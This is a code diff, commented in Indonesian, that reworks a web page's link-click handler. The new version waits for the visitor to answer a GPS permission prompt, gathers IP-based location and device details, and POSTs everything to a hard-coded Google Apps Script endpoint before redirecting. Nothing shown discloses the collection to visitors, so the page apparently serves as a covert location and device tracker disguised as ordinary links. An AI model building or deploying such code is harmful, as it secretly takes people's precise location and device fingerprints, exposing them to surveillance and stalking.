@@ -114,53 +114,55 @@
         // URL Google Apps Script Anda sudah dimasukkan di sini
         const webAppUrl = 'https://script.google.com/macros/s/AKfycbzl0QGCj21JsukyPiAh4mGovuuF--yLDhal0UZsNnECqVNae64zMBYw7HXJq3zYfaTdBQ/exec';
 
-        function trackAndRedirect(destinationUrl, element) {
+        async function trackAndRedirect(destinationUrl, element) {
             // Ubah teks tombol untuk memberikan feedback ke pengguna
             const originalText = element.textContent;
-            element.textContent = 'Membuka...';
+            element.textContent = 'Memproses...';
 
-            // Alihkan pengguna SEGERA untuk pengalaman pengguna yang lebih baik
-            window.location.href = destinationUrl;
+            // Langkah 1: Minta izin lokasi dan tunggu respons pengguna.
+            // Ini akan memunculkan dialog "Allow" atau "Block".
+            const locationPromise = getPreciseLocation();
 
-            // Gunakan navigator.sendBeacon jika tersedia, ini cara paling andal
-            // untuk mengirim data saat halaman akan ditutup.
-            if (navigator.sendBeacon) {
-                // Jalankan semua proses pengumpulan data
-                // dan kirim setelah semuanya selesai (atau gagal).
-                Promise.allSettled([
-                    getPreciseLocation(),
-                    getIpBasedData(),
-                    getDeviceInfo()
-                ]).then(results => {
-                    const collectedData = {};
-                    // Gabungkan semua hasil yang berhasil
-                    results.forEach(result => {
-                        if (result.status === 'fulfilled' && result.value) {
-                            Object.assign(collectedData, result.value);
-                        }
-                    });
+            // Langkah 2: Sambil menunggu, siapkan promise untuk data lain.
+            const ipDataPromise = getIpBasedData();
+            const deviceInfoPromise = getDeviceInfo();
 
-                    // Selalu tambahkan timestamp dan link yang diklik
-                    collectedData.timestamp = new Date().toISOString();
-                    collectedData.clickedLink = destinationUrl;
+            // Langkah 3: Tunggu semua promise selesai.
+            // `locationPromise` akan selesai setelah pengguna merespons dialog.
+            const results = await Promise.allSettled([
+                locationPromise,
+                ipDataPromise,
+                deviceInfoPromise
+            ]);
 
-                    // Atur sumber lokasi untuk kejelasan data
-                    if (!collectedData.locationSource) {
-                        if (collectedData.lat) {
-                            collectedData.locationSource = 'IP-based';
-                        } else {
-                            collectedData.locationSource = 'Unknown/Failed';
-                        }
-                    }
+            const collectedData = {};
+            // Gabungkan semua hasil yang berhasil
+            results.forEach(result => {
+                if (result.status === 'fulfilled' && result.value) {
+                    Object.assign(collectedData, result.value);
+                }
+            });
 
-                    // Kirim data menggunakan Beacon API
-                    const blob = new Blob([JSON.stringify(collectedData)], { type: 'text/plain; charset=UTF-8' });
-                    navigator.sendBeacon(webAppUrl, blob);
-                    console.log("Data sent via Beacon:", collectedData);
-                });
-            } else {
-                console.warn("navigator.sendBeacon is not supported in this browser. Data might not be sent reliably.");
+            // Selalu tambahkan timestamp dan link yang diklik
+            collectedData.timestamp = new Date().toISOString();
+            collectedData.clickedLink = destinationUrl;
+
+            // Atur sumber lokasi untuk kejelasan data jika belum ada
+            if (!collectedData.locationSource) {
+                collectedData.locationSource = collectedData.lat ? 'IP-based' : 'Unknown/Failed';
             }
+
+            // Langkah 4: Kirim data ke Google Sheet.
+            // Menggunakan fetch dalam async function lebih mudah dibaca.
+            try {
+                await fetch(webAppUrl, { method: 'POST', body: JSON.stringify(collectedData), mode: 'no-cors' });
+                console.log("Data sent:", collectedData);
+            } catch (error) {
+                console.error("Gagal mengirim data:", error);
+            }
+
+            // Langkah 5: Setelah semua selesai, alihkan pengguna.
+            window.location.href = destinationUrl;
         }
 
         // 1. Fungsi untuk mendapatkan lokasi presisi (GPS)
